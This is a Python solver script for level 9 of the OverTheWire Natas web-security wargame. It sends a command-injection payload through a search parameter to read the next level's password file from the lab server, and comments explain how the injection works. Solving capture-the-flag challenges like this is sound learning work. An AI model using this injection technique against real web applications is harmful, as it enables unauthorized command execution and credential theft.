import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    #"secret" value to beat level
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '9'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    #In order to inject arbitrary commands, bypass "grep" by sending output to /dev/null, then 
    # use ; to allow for executing another command (cat passfile), lastly # to comment out the dictionary.txt portion
    thread = 'a > /dev/null; cat /etc/natas_webpass/natas10 #'
    auth = HTTPBasicAuth('natas9', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    payload = {'needle':thread, 'submit':'Search'}
    r = requests.get('http://natas9.natas.labs.overthewire.org/', auth=('natas9', passw.strip()), params=payload)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])

if __name__ == "__main__":
    get_pass()
